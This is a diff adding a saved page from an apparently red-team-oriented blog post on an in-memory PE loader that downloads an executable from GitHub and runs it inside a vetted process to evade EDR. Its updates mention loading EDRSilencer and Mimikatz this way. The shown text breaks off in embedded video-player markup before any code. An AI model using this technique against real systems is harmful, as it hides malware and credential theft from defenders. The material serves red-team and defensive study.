@@ -1,0 +1,658 @@
+# https://g3tsyst3m.com/fileless%20techniques/Bypassing-EDR-using-an-In-Memory-PE-Loader/
+
+<!DOCTYPE html><!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+--><html lang="en" class=" js " dir="ltr" data-cast-api-enabled="true">
+
+  <body class="layout--single wide" dir="ltr">
+    
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+<div id="main" role="main">
+  
+  
+
+
+
+  <article class="page h-entry" itemscope="" itemtype="https://schema.org/CreativeWork">
+    
+    
+    
+    
+
+    <div class="page__inner-wrap">
+      
+        
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+        <p>It’s high time we get another blog post going, and what better time than now to talk about PE loaders! Specifically, an In-Memory PE Loader. 😸  In short, we’re going to implement a PE (Portable Executable) loader that downloads a PE file (in this case, <code class="language-plaintext highlighter-rouge">putty.exe</code>) from one of my Github repos.  We will then load it directly into a section of memory within the calling process and execute putty without ever writing it to disk! Essentially, we are using what’s called <code class="language-plaintext highlighter-rouge">Dynamic Execution</code>: The code is able to load and execute any valid 64-bit PE file (e.g., EXE or DLL) from a remote source, in our case, a Github file URL where I simply uploaded <code class="language-plaintext highlighter-rouge">putty.exe</code> to one of my github repos.</p>
+
+<p>Not only that, but it’s also loading it into the calling process that we’re assuming has been loaded successfully and already passed all the familiar EDR checks.  So, EDR basically says “this executable checks out, let’s let the user run it” 🙂  Now that we’re on good talking terms with EDR, we then sneak in another portable executable, from memory, into our already approved/vetted process!  I’ve loaded various executable’s using this technique, many lazily thrown together with shotty code and heavy use of syscalls, obfuscation, you name it.  I very rarely triggered EDR alerts, at least using the EDR solutions I test with.  I mainly use Defender XDR and Sophos XDR these days, though I’d like to try others at some point.  PE Loader’s, especially custom made where we load the PE image from memory, are very useful for red team engagements.  Stay with me and I’ll walk you through how the code is laid out!</p>
+
+<blockquote>
+  <p><strong>IMPORTANT UPDATE!</strong>
+less than 24 hours into making this post live, people are already questioning the usefulness of using putty as our PE for this exercise.  First off, my intention was to demonstrate how we can load PE’s that have GUIs.  Second, putty is easy to find and use.  It’s great for demo’s.  But for those that want to see the effectiveness of bypassing EDR more specifically, I get it.  So, i’ve retroactively added in a well known and flagged EDR bypass tool to prove the effectiveness of using PE Loaders. I’ll share the screenshot of this in action so you can see how we can effectively bypass the EDR solutions I’m able to test against.  We will be using the EDRSilencer tool: <a href="https://github.com/netero1010/EDRSilencer">EDR Silencer</a> Awesome tool btw!  Kudos to the author.</p>
+</blockquote>
+
+<blockquote>
+  <p><strong>UPDATE #2 LOL: Now we’re cookin!  Let’s Load Mimikatz too while we’re at it 😸</strong></p>
+</blockquote>
+
+<div class="fluid-width-video-wrapper" style="padding-top: 66.6667%;"><div src="https://www.youtube.com/embed/fYhWRyyGO5s" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" id="fitvid0" data-original-tag="iframe"><link rel="stylesheet" href="https://www.youtube.com/s/player/1798f86c/www-player.css" name="www-player" nonce="6ZpiuR_SLTaehG82sQBRAQ"><link rel="preload" href="https://www.youtube.com/s/player/1798f86c/player_es6.vflset/en_US/embed.js" name="player/embed" as="script" nonce="6ZpiuR_SLTaehG82sQBRAQ"><link rel="preconnect" href="https://i.ytimg.com/"><title>in-memory PE Loader &amp; mimikatz :D - YouTube</title><link rel="canonical" href="https://www.youtube.com/watch?v=fYhWRyyGO5s"><div id="player" style="width: 100%; height: 100%;"><div class="html5-video-player ytp-exp-bottom-control-flexbox ytp-modern-caption ytp-livebadge-color ytp-title-enable-channel-logo ytp-fine-scrubbing-exp ytp-embed ytp-embed-playlist ytp-cards-teaser-dismissible unstarted-mode ytp-hide-controls ytp-large-width-mode" tabindex="-1" id="movie_player" data-version="/s/player/1798f86c/player_es6.vflset/en_US/base.js" aria-label="YouTube Video Player"><div class="html5-video-container" data-layer="0"><video tabindex="-1" aria-hidden="true" class="video-stream html5-main-video" webkit-playsinline="" playsinline="" controlslist="nodownload" style="width: 1888px; height: 1259px; left: 0px; top: -1259px;"></video></div><div class="ytp-gradient-top" data-layer="1"></div><div class="ytp-chrome-top ytp-show-cards-title" data-layer="1"><div class="ytp-title-channel"><div class="ytp-title-beacon"></div><a class="ytp-title-channel-logo" target="_blank" role="link" tabindex="0" href="https://www.youtube.com/channel/UC2Q1udfnPuOnr7pBge3YgDA?embeds_referring_euri=https%3A%2F%2Fg3tsyst3m.com%2F" aria-label="Photo image of R.B.C." style="background-image: url(&quot;https://yt3.ggpht.com/y-6PCc3fQZFhKMYuO4-_8SGhqeDCkkB1Mcsm15ERZxb3njPm0ws6ONV-7PTLjmq2Q20tPjmDUV4=s68-c-k-c0x00ffffff-no-rj&quot;);"></a><div class="ytp-title-expanded-overlay" aria-hidden="true"><div class="ytp-title-expanded-heading"><div class="ytp-title-expanded-title"><a target="_blank" tabindex="-1" aria-hidden="true">R.B.C.</a></div><div class="ytp-title-expanded-subtitle" aria-hidden="true">47 subscribers</div></div></div></div><div class="ytp-title"><div class="ytp-title-text "><a class="ytp-title-link yt-uix-sessionlink" target="_blank" data-sessionlink="feature=player-title" tabindex="0" href="https://www.youtube.com/watch?v=fYhWRyyGO5s">in-memory PE Loader &amp; mimikatz :D</a><div class="ytp-title-subtext"><a class="ytp-title-channel-name" target="_blank" href="https://www.youtube.com/embed/fYhWRyyGO5s"></a></div></div></div><div class="ytp-shorts-title-channel" style="display: none;"><a class="ytp-shorts-title-channel-logo" target="_blank" aria-label="Photo image of R.B.C." style="background-image: url(&quot;https://yt3.ggpht.com/y-6PCc3fQZFhKMYuO4-_8SGhqeDCkkB1Mcsm15ERZxb3njPm0ws6ONV-7PTLjmq2Q20tPjmDUV4=s68-c-k-c0x00ffffff-no-rj&quot;);"></a><div class="ytp-shorts-title-expanded-heading"><div class="ytp-shorts-title-expanded-title"><a target="_blank" tabindex="0">R.B.C.</a></div></div></div><div class="ytp-chrome-top-buttons"><button class="ytp-button ytp-search-button ytp-show-search-title" title="" data-tooltip-title="Search" data-tooltip-opaque="true" aria-label="Search" style="display: none;"><div class="ytp-search-icon"><svg height="100%" version="1.1" viewBox="0 0 24 24" width="100%"><path class="ytp-svg-fill" d="M21.24,19.83l-5.64-5.64C16.48,13.02,17,11.57,17,10c0-3.87-3.13-7-7-7s-7,3.13-7,7c0,3.87,3.13,7,7,7 c1.57,0,3.02-0.52,4.19-1.4l5.64,5.64L21.24,19.83z M5,10c0-2.76,2.24-5,5-5s5,2.24,5,5c0,2.76-2.24,5-5,5S5,12.76,5,10z"></path></svg></div><div class="ytp-search-title">Search</div></button><button class="ytp-watch-later-button ytp-button ytp-show-watch-later-title" title="" data-tooltip-opaque="true" data-tooltip-title="Watch later" aria-label="Watch later" style="display: none;"><div class="ytp-watch-later-icon"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%"><use class="ytp-svg-shadow" xlink:href="#ytp-id-26"></use><path class="ytp-svg-fill" d="M18,8 C12.47,8 8,12.47 8,18 C8,23.52 12.47,28 18,28 C23.52,28 28,23.52 28,18 C28,12.47 23.52,8 18,8 L18,8 Z M16,19.02 L16,12.00 L18,12.00 L18,17.86 L23.10,20.81 L22.10,22.54 L16,19.02 Z" id="ytp-id-26"></path></svg></div><div class="ytp-watch-later-title">Watch later</div></button><button class="ytp-button ytp-share-button ytp-show-share-title ytp-share-button-visible" title="" data-tooltip-title="Share" aria-haspopup="true" aria-owns="ytp-id-25" data-tooltip-opaque="true" aria-label="Share"><div class="ytp-share-icon"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%"><use class="ytp-svg-shadow" xlink:href="#ytp-id-27"></use><path class="ytp-svg-fill" d="m 20.20,14.19 0,-4.45 7.79,7.79 -7.79,7.79 0,-4.56 C 16.27,20.69 12.10,21.81 9.34,24.76 8.80,25.13 7.60,27.29 8.12,25.65 9.08,21.32 11.80,17.18 15.98,15.38 c 1.33,-0.60 2.76,-0.98 4.21,-1.19 z" id="ytp-id-27"></path></svg></div><div class="ytp-share-title">Share</div></button><button class="ytp-button ytp-copylink-button ytp-show-copylink-title" title="" data-tooltip-opaque="true" data-tooltip-title="Copy link" aria-label="Copy link" style="display: none;"><div class="ytp-copylink-icon"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%"><use class="ytp-svg-shadow" xlink:href="#ytp-id-28"></use><path class="ytp-svg-fill" d="M21.9,8.3H11.3c-0.9,0-1.7,.8-1.7,1.7v12.3h1.7V10h10.6V8.3z M24.6,11.8h-9.7c-1,0-1.8,.8-1.8,1.8v12.3  c0,1,.8,1.8,1.8,1.8h9.7c1,0,1.8-0.8,1.8-1.8V13.5C26.3,12.6,25.5,11.8,24.6,11.8z M24.6,25.9h-9.7V13.5h9.7V25.9z" id="ytp-id-28"></path></svg></div><div class="ytp-copylink-title" aria-hidden="true">Copy link</div></button><button class="ytp-playlist-menu-button ytp-button" title="" aria-owns="ytp-id-22" aria-haspopup="true" aria-label="Playlist" data-overlay-order="3" style="display: none;"><div class="ytp-playlist-menu-button-icon"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%"><use class="ytp-svg-shadow" xlink:href="#ytp-id-23"></use><path d="m 22.53,21.42 0,6.85 5.66,-3.42 -5.66,-3.42 0,0 z m -11.33,0 9.06,0 0,2.28 -9.06,0 0,-2.28 0,0 z m 0,-9.14 13.6,0 0,2.28 -13.6,0 0,-2.28 0,0 z m 0,4.57 13.6,0 0,2.28 -13.6,0 0,-2.28 0,0 z" fill="#fff" id="ytp-id-23"></path></svg></div><div class="ytp-playlist-menu-button-title"></div><div class="ytp-playlist-menu-button-text"></div></button><button class="ytp-button ytp-cards-button" aria-label="Show cards" aria-owns="iv-drawer" aria-haspopup="true" data-tooltip-opaque="true" style="display: none;"><span class="ytp-cards-button-icon-default"><div class="ytp-cards-button-icon"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%"><use class="ytp-svg-shadow" xlink:href="#ytp-id-2"></use><path class="ytp-svg-fill" d="m 17,23 h 2 V 17 H 17 Z M 18,8 C 12.47,8 8,12.47 8,18 8,23.52 12.47,28 18,28 23.52,28 28,23.52 28,18 28,12.47 23.52,8 18,8 Z m 0,18 c -4.41,0 -8,-3.59 -8,-8 0,-4.41 3.59,-8 8,-8 4.41,0 8,3.59 8,8 0,4.41 -3.59,8 -8,8 z M 17,15 h 2 v -2 h -2 z" id="ytp-id-2"></path></svg></div><div class="ytp-cards-button-title">Info</div></span><span class="ytp-cards-button-icon-shopping"><div class="ytp-cards-button-icon"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%"><path class="ytp-svg-shadow" d="M 27.99,18 A 9.99,9.99 0 1 1 8.00,18 9.99,9.99 0 1 1 27.99,18 z"></path><path class="ytp-svg-fill" d="M 18,8 C 12.47,8 8,12.47 8,18 8,23.52 12.47,28 18,28 23.52,28 28,23.52 28,18 28,12.47 23.52,8 18,8 z m -4.68,4 4.53,0 c .35,0 .70,.14 .93,.37 l 5.84,5.84 c .23,.23 .37,.58 .37,.93 0,.35 -0.13,.67 -0.37,.90 L 20.06,24.62 C 19.82,24.86 19.51,25 19.15,25 c -0.35,0 -0.70,-0.14 -0.93,-0.37 L 12.37,18.78 C 12.13,18.54 12,18.20 12,17.84 L 12,13.31 C 12,12.59 12.59,12 13.31,12 z m .96,1.31 c -0.53,0 -0.96,.42 -0.96,.96 0,.53 .42,.96 .96,.96 .53,0 .96,-0.42 .96,-0.96 0,-0.53 -0.42,-0.96 -0.96,-0.96 z" fill-opacity="1"></path><path class="ytp-svg-shadow-fill" d="M 24.61,18.22 18.76,12.37 C 18.53,12.14 18.20,12 17.85,12 H 13.30 C 12.58,12 12,12.58 12,13.30 V 17.85 c 0,.35 .14,.68 .38,.92 l 5.84,5.85 c .23,.23 .55,.37 .91,.37 .35,0 .68,-0.14 .91,-0.38 L 24.61,20.06 C 24.85,19.83 25,19.50 25,19.15 25,18.79 24.85,18.46 24.61,18.22 z M 14.27,15.25 c -0.53,0 -0.97,-0.43 -0.97,-0.97 0,-0.53 .43,-0.97 .97,-0.97 .53,0 .97,.43 .97,.97 0,.53 -0.43,.97 -0.97,.97 z" fill="#000" fill-opacity="0.15"></path></svg></div><div class="ytp-cards-button-title">Shopping</div></span></button><div class="ytp-cards-teaser" style="display: none;"><div class="ytp-cards-teaser-box"></div><div class="ytp-cards-teaser-text"><button class="ytp-cards-teaser-info-icon" aria-label="Show cards" aria-haspopup="true"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%"><use class="ytp-svg-shadow" xlink:href="#ytp-id-29"></use><path class="ytp-svg-fill" d="m 17,23 h 2 V 17 H 17 Z M 18,8 C 12.47,8 8,12.47 8,18 8,23.52 12.47,28 18,28 23.52,28 28,23.52 28,18 28,12.47 23.52,8 18,8 Z m 0,18 c -4.41,0 -8,-3.59 -8,-8 0,-4.41 3.59,-8 8,-8 4.41,0 8,3.59 8,8 0,4.41 -3.59,8 -8,8 z M 17,15 h 2 v -2 h -2 z" id="ytp-id-29"></path></svg></button><img class="ytp-cards-teaser-channel-avatar" alt="" aria-hidden="true"><span class="ytp-cards-teaser-label"></span><button class="ytp-cards-teaser-close-button" aria-label="Close"><svg height="100%" viewBox="0 0 24 24" width="100%"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" fill="#fff"></path></svg></button></div></div><button class="ytp-button ytp-overflow-button" title="" data-tooltip-title="More" aria-haspopup="true" aria-owns="ytp-id-30" aria-label="More" style="display: none;"><div class="ytp-overflow-icon"><svg height="100%" viewBox="-5 -5 36 36" width="100%"><path d="M12 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm0 2c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm0 6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z" fill="#fff"></path></svg></div></button></div></div><button class="ytp-unmute ytp-popup ytp-button ytp-unmute-animated ytp-unmute-shrink" data-layer="2" style="display: none;"><div class="ytp-unmute-inner"><div class="ytp-unmute-icon"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%"><use class="ytp-svg-shadow" xlink:href="#ytp-id-1"></use><path class="ytp-svg-fill" d="m 21.48,17.98 c 0,-1.77 -1.02,-3.29 -2.5,-4.03 v 2.21 l 2.45,2.45 c .03,-0.2 .05,-0.41 .05,-0.63 z m 2.5,0 c 0,.94 -0.2,1.82 -0.54,2.64 l 1.51,1.51 c .66,-1.24 1.03,-2.65 1.03,-4.15 0,-4.28 -2.99,-7.86 -7,-8.76 v 2.05 c 2.89,.86 5,3.54 5,6.71 z M 9.25,8.98 l -1.27,1.26 4.72,4.73 H 7.98 v 6 H 11.98 l 5,5 v -6.73 l 4.25,4.25 c -0.67,.52 -1.42,.93 -2.25,1.18 v 2.06 c 1.38,-0.31 2.63,-0.95 3.69,-1.81 l 2.04,2.05 1.27,-1.27 -9,-9 -7.72,-7.72 z m 7.72,.99 -2.09,2.08 2.09,2.09 V 9.98 z" id="ytp-id-1"></path></svg></div><div class="ytp-unmute-text">Tap to unmute</div><div class="ytp-unmute-box"></div></div></button><div class="ytp-player-content ytp-timely-actions-content" data-layer="4" style="display: none;"></div><div class="ytp-cued-thumbnail-overlay" data-layer="4" style=""><div class="ytp-cued-thumbnail-overlay-image" style="background-image: url(&quot;https://i.ytimg.com/vi/fYhWRyyGO5s/maxresdefault.jpg?sqp=-oaymwEmCIAKENAF8quKqQMa8AEB-AH-CYACrAWKAgwIABABGGAgYChgMA8=&amp;rs=AOn4CLDOgwC6TjBJTXp3bgO9zVb1xC2S4Q&quot;);"></div><button class="ytp-large-play-button ytp-button ytp-large-play-button-red-bg" aria-label="Play" title="Play"><svg height="100%" version="1.1" viewBox="0 0 68 48" width="100%"><path class="ytp-large-play-button-bg" d="M66.52,7.74c-0.78-2.93-2.49-5.41-5.42-6.19C55.79,.13,34,0,34,0S12.21,.13,6.9,1.55 C3.97,2.33,2.27,4.81,1.48,7.74C0.06,13.05,0,24,0,24s0.06,10.95,1.48,16.26c0.78,2.93,2.49,5.41,5.42,6.19 C12.21,47.87,34,48,34,48s21.79-0.13,27.1-1.55c2.93-0.78,4.64-3.26,5.42-6.19C67.94,34.95,68,24,68,24S67.94,13.05,66.52,7.74z" fill="#f03"></path><path d="M 45,24 27,14 27,34" fill="#fff"></path></svg></button></div><div class="ytp-spinner" data-layer="4" style="display: none;"><div class="ytp-spinner-container"><div class="ytp-spinner-rotator"><div class="ytp-spinner-left"><div class="ytp-spinner-circle"></div></div><div class="ytp-spinner-right"><div class="ytp-spinner-circle"></div></div></div></div><div class="ytp-spinner-message" style="display: none;">If playback doesn't begin shortly, try restarting your device.</div></div><div class="ytp-paid-content-overlay" aria-live="assertive" aria-atomic="true" data-overlay-order="5" data-layer="4"><div class="ytp-button ytp-paid-content-overlay-text" style="display: none;"></div></div><div class="ytp-storyboard-framepreview" data-layer="4" style="display: none;"><div class="ytp-storyboard-framepreview-timestamp"></div><div class="ytp-storyboard-framepreview-img"></div></div><div data-layer="4" style="display: none;"><div class="ytp-bezel-text-wrapper"><div class="ytp-bezel-text"></div></div><div class="ytp-bezel" role="status"><div class="ytp-bezel-icon"></div></div></div><div class="ytp-doubletap-ui-legacy" data-layer="4" style="display: none;"><div class="ytp-doubletap-fast-forward-ve"></div><div class="ytp-doubletap-rewind-ve"></div><div class="ytp-doubletap-static-circle"><div class="ytp-doubletap-ripple"></div></div><div class="ytp-doubletap-overlay-a11y"></div><div class="ytp-doubletap-seek-info-container"><div class="ytp-doubletap-arrows-container"><span class="ytp-doubletap-base-arrow"></span><span class="ytp-doubletap-base-arrow"></span><span class="ytp-doubletap-base-arrow"></span></div><div class="ytp-doubletap-tooltip"><div class="ytp-seek-icon-text-container"><div class="ytp-seek-icon" style="display: none;"></div><div class="ytp-chapter-seek-text-legacy"></div></div><div class="ytp-doubletap-tooltip-label"></div></div></div></div><div data-layer="4" aria-live="polite" style="display: none;"><div class="ytp-tooltip-text-wrapper"><div class="ytp-tooltip-edu"><svg height="100%" viewBox="0 0 36 36" width="100%"><path d="M14.1 36.75 12 34.65 24 22.65 36 34.65 33.9 36.75 24 26.85ZM14.1 24.1 12 22 24 10 36 22 33.9 24.1 24 14.2Z"></path></svg><span></span></div><div class="ytp-tooltip-image"></div><div class="ytp-tooltip-title"><span></span><div class="ytp-tooltip-keyboard-shortcut"></div></div><div class="ytp-tooltip-bottom-text"><span class="ytp-tooltip-text"></span><div class="ytp-tooltip-keyboard-shortcut"></div></div><div class="ytp-tooltip-progress-bar-pill"><div class="ytp-tooltip-progress-bar-pill-time-stamp"></div><div class="ytp-tooltip-progress-bar-pill-title"></div></div></div><div class="ytp-tooltip-bg"><div class="ytp-tooltip-duration"></div></div></div><div class="ytp-suggested-action" data-overlay-order="7" data-layer="4"><button class="ytp-button ytp-suggested-action-badge ytp-suggested-action-badge-with-controls" style="display: none;"><div class="ytp-suggested-action-badge-icon-container"></div><div class="ytp-suggested-action-badge-expanded-content-container" style="display: none;"><label class="ytp-suggested-action-badge-title"></label></div></button><button class="ytp-suggested-action-badge-dismiss-button-icon ytp-button"></button></div></div><button class="ytp-info-panel-preview" aria-live="assertive" aria-atomic="true" aria-owns="ytp-id-31" aria-haspopup="true" data-tooltip-opaque="true" data-layer="4" style="display: none;"><div class="ytp-info-panel-preview-text"></div><div class="ytp-info-panel-preview-chevron"></div></button><div class="ytp-pause-overlay-container" tabindex="-1" data-layer="4"><div class="ytp-pause-overlay" tabindex="-1" style="display: none;"><button class="ytp-button ytp-collapse" aria-label="Hide more videos"><div class="ytp-collapse-icon"><svg height="100%" viewBox="0 0 16 16" width="100%"><path d="M13 4L12 3 8 7 4 3 3 4 7 8 3 12 4 13 8 9 12 13 13 12 9 8z" fill="#fff"></path></svg></div></button><button class="ytp-button ytp-expand">More videos</button><div class="ytp-more-videos-view ytp-scroll-min ytp-scroll-max" tabindex="-1"><h2 class="ytp-related-title">More videos</h2><div class="ytp-suggestions" style="height: 98px;"><a class="ytp-suggestion-link" target="_blank" style="transition-delay: 0s; display: none;"><div class="ytp-suggestion-image" style="width: 175px; height: 98px;"></div><div class="ytp-suggestion-overlay" style=""><div class="ytp-suggestion-title"></div><div class="ytp-suggestion-author"></div><div class="ytp-suggestion-duration"></div></div></a><a class="ytp-suggestion-link" target="_blank" style="transition-delay: 0.05s; display: none;"><div class="ytp-suggestion-image" style="width: 175px; height: 98px;"></div><div class="ytp-suggestion-overlay" style=""><div class="ytp-suggestion-title"></div><div class="ytp-suggestion-author"></div><div class="ytp-suggestion-duration"></div></div></a><a class="ytp-suggestion-link" target="_blank" style="transition-delay: 0.1s; display: none;"><div class="ytp-suggestion-image" style="width: 175px; height: 98px;"></div><div class="ytp-suggestion-overlay" style=""><div class="ytp-suggestion-title"></div><div class="ytp-suggestion-author"></div><div class="ytp-suggestion-duration"></div></div></a><a class="ytp-suggestion-link" target="_blank" style="transition-delay: 0.15s; display: none;"><div class="ytp-suggestion-image" style="width: 175px; height: 98px;"></div><div class="ytp-suggestion-overlay" style=""><div class="ytp-suggestion-title"></div><div class="ytp-suggestion-author"></div><div class="ytp-suggestion-duration"></div></div></a><a class="ytp-suggestion-link" target="_blank" style="transition-delay: 0.2s; display: none;"><div class="ytp-suggestion-image" style="width: 175px; height: 98px;"></div><div class="ytp-suggestion-overlay" style=""><div class="ytp-suggestion-title"></div><div class="ytp-suggestion-author"></div><div class="ytp-suggestion-duration"></div></div></a><a class="ytp-suggestion-link" target="_blank" style="transition-delay: 0.25s; display: none;"><div class="ytp-suggestion-image" style="width: 175px; height: 98px;"></div><div class="ytp-suggestion-overlay" style=""><div class="ytp-suggestion-title"></div><div class="ytp-suggestion-author"></div><div class="ytp-suggestion-duration"></div></div></a><a class="ytp-suggestion-link" target="_blank" style="transition-delay: 0.3s; display: none;"><div class="ytp-suggestion-image" style="width: 175px; height: 98px;"></div><div class="ytp-suggestion-overlay" style=""><div class="ytp-suggestion-title"></div><div class="ytp-suggestion-author"></div><div class="ytp-suggestion-duration"></div></div></a><a class="ytp-suggestion-link" target="_blank" style="transition-delay: 0.35s; display: none;"><div class="ytp-suggestion-image" style="width: 175px; height: 98px;"></div><div class="ytp-suggestion-overlay" style=""><div class="ytp-suggestion-title"></div><div class="ytp-suggestion-author"></div><div class="ytp-suggestion-duration"></div></div></a><a class="ytp-suggestion-link" target="_blank" style="transition-delay: 0.4s; display: none;"><div class="ytp-suggestion-image" style="width: 175px; height: 98px;"></div><div class="ytp-suggestion-overlay" style=""><div class="ytp-suggestion-title"></div><div class="ytp-suggestion-author"></div><div class="ytp-suggestion-duration"></div></div></a><a class="ytp-suggestion-link" target="_blank" style="transition-delay: 0.45s; display: none;"><div class="ytp-suggestion-image" style="width: 175px; height: 98px;"></div><div class="ytp-suggestion-overlay" style=""><div class="ytp-suggestion-title"></div><div class="ytp-suggestion-author"></div><div class="ytp-suggestion-duration"></div></div></a><a class="ytp-suggestion-link" target="_blank" style="transition-delay: 0.5s; display: none;"><div class="ytp-suggestion-image" style="width: 175px; height: 98px;"></div><div class="ytp-suggestion-overlay" style=""><div class="ytp-suggestion-title"></div><div class="ytp-suggestion-author"></div><div class="ytp-suggestion-duration"></div></div></a><a class="ytp-suggestion-link" target="_blank" style="transition-delay: 0.55s; display: none;"><div class="ytp-suggestion-image" style="width: 175px; height: 98px;"></div><div class="ytp-suggestion-overlay" style=""><div class="ytp-suggestion-title"></div><div class="ytp-suggestion-author"></div><div class="ytp-suggestion-duration"></div></div></a><a class="ytp-suggestion-link" target="_blank" style="transition-delay: 0.6s; display: none;"><div class="ytp-suggestion-image" style="width: 175px; height: 98px;"></div><div class="ytp-suggestion-overlay" style=""><div class="ytp-suggestion-title"></div><div class="ytp-suggestion-author"></div><div class="ytp-suggestion-duration"></div></div></a><a class="ytp-suggestion-link" target="_blank" style="transition-delay: 0.65s; display: none;"><div class="ytp-suggestion-image" style="width: 175px; height: 98px;"></div><div class="ytp-suggestion-overlay" style=""><div class="ytp-suggestion-title"></div><div class="ytp-suggestion-author"></div><div class="ytp-suggestion-duration"></div></div></a><a class="ytp-suggestion-link" target="_blank" style="transition-delay: 0.7s; display: none;"><div class="ytp-suggestion-image" style="width: 175px; height: 98px;"></div><div class="ytp-suggestion-overlay" style=""><div class="ytp-suggestion-title"></div><div class="ytp-suggestion-author"></div><div class="ytp-suggestion-duration"></div></div></a><a class="ytp-suggestion-link" target="_blank" style="transition-delay: 0.75s; display: none;"><div class="ytp-suggestion-image" style="width: 175px; height: 98px;"></div><div class="ytp-suggestion-overlay" style=""><div class="ytp-suggestion-title"></div><div class="ytp-suggestion-author"></div><div class="ytp-suggestion-duration"></div></div></a></div><button class="ytp-button ytp-previous" aria-label="Show previous suggested videos" style="bottom: 65px;"><svg height="100%" version="1.1" viewBox="0 0 32 32" width="100%"><path d="M 19.41,20.09 14.83,15.5 19.41,10.91 18,9.5 l -6,6 6,6 z" fill="#fff"></path></svg></button><button class="ytp-button ytp-next" aria-label="Show more suggested videos" style="bottom: 65px;"><svg height="100%" version="1.1" viewBox="0 0 32 32" width="100%"><path d="m 12.59,20.34 4.58,-4.59 -4.58,-4.59 1.41,-1.41 6,6 -6,6 z" fill="#fff"></path></svg></button></div></div></div><div class="ytp-muted-autoplay-overlay" data-layer="4" style="display: none;"><div class="ytp-muted-autoplay-bottom-buttons"><button class="ytp-muted-autoplay-equalizer ytp-button" aria-label="Muted Playback Indicator"><div class="ytp-muted-autoplay-equalizer-icon"><svg height="100%" version="1.1" viewBox="-4 -4 24 24" width="100%"><g fill="#fff"><rect class="ytp-equalizer-bar-left" height="9" width="4" x="1" y="7"></rect><rect class="ytp-equalizer-bar-middle" height="14" width="4" x="6" y="2"></rect><rect class="ytp-equalizer-bar-right" height="12" width="4" x="11" y="4"></rect></g></svg></div></button></div></div><div class="ytp-muted-autoplay-endscreen-overlay" data-layer="4" style="display: none;"><div class="ytp-muted-autoplay-end-panel"><button class="ytp-muted-autoplay-end-text ytp-button"></button></div></div><div class="ytp-remote" data-layer="4" style="display: none;"><div class="ytp-remote-display-status"><div class="ytp-remote-display-status-icon"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%"><use class="ytp-svg-shadow" xlink:href="#ytp-id-34"></use><path d="M7,24 L7,27 L10,27 C10,25.34 8.66,24 7,24 L7,24 Z M7,20 L7,22 C9.76,22 12,24.24 12,27 L14,27 C14,23.13 10.87,20 7,20 L7,20 Z M25,13 L11,13 L11,14.63 C14.96,15.91 18.09,19.04 19.37,23 L25,23 L25,13 L25,13 Z M7,16 L7,18 C11.97,18 16,22.03 16,27 L18,27 C18,20.92 13.07,16 7,16 L7,16 Z M27,9 L9,9 C7.9,9 7,9.9 7,11 L7,14 L9,14 L9,11 L27,11 L27,25 L20,25 L20,27 L27,27 C28.1,27 29,26.1 29,25 L29,11 C29,9.9 28.1,9 27,9 L27,9 Z" fill="#fff" id="ytp-id-34"></path></svg></div><div class="ytp-remote-display-status-text"></div></div></div><div class="ytp-mdx-popup-dialog" role="dialog" data-layer="4" style="display: none;"><div class="ytp-mdx-popup-dialog-inner-content"><div class="ytp-mdx-popup-title">You're signed out</div><div class="ytp-mdx-popup-description">Videos you watch may be added to the TV's watch history and influence TV recommendations. To avoid this, cancel and sign in to YouTube on your computer.</div><div class="ytp-mdx-privacy-popup-buttons"><button class="ytp-button ytp-mdx-privacy-popup-cancel">Cancel</button><button class="ytp-button ytp-mdx-privacy-popup-confirm">Confirm</button></div></div></div><div class="ytp-playlist-menu" role="dialog" id="ytp-id-22" data-layer="5" style="display: none;"><div class="ytp-playlist-menu-header"><div class="ytp-playlist-menu-title"><a class="ytp-playlist-menu-title-name"></a><button class="ytp-playlist-menu-close ytp-button" aria-label="Close"><svg height="100%" viewBox="0 0 24 24" width="100%"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" fill="#fff"></path></svg></button></div><div class="ytp-playlist-menu-subtitle"></div></div><div class="ytp-playlist-menu-items" role="menu"></div></div><div class="ytp-share-panel" id="ytp-id-25" role="dialog" aria-labelledby="ytp-id-24" data-layer="5" style="display: none;"><div class="ytp-share-panel-inner-content"><div class="ytp-share-panel-title" id="ytp-id-24">Share</div><a class="ytp-share-panel-link ytp-no-contextmenu" target="_blank" title="Share link"></a><label class="ytp-share-panel-include-playlist"><input class="ytp-share-panel-include-playlist-checkbox" type="checkbox" checked="true">Include playlist</label><div class="ytp-share-panel-loading-spinner"><div class="ytp-spinner-container"><div class="ytp-spinner-rotator"><div class="ytp-spinner-left"><div class="ytp-spinner-circle"></div></div><div class="ytp-spinner-right"><div class="ytp-spinner-circle"></div></div></div></div></div><div class="ytp-share-panel-service-buttons"></div><div class="ytp-share-panel-error">An error occurred while retrieving sharing information. Please try again later.</div></div><button class="ytp-share-panel-close ytp-button" title="Close"><svg height="100%" viewBox="0 0 24 24" width="100%"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" fill="#fff"></path></svg></button></div><div class="ytp-overflow-panel" id="ytp-id-30" role="dialog" data-layer="5" style="display: none;"><div 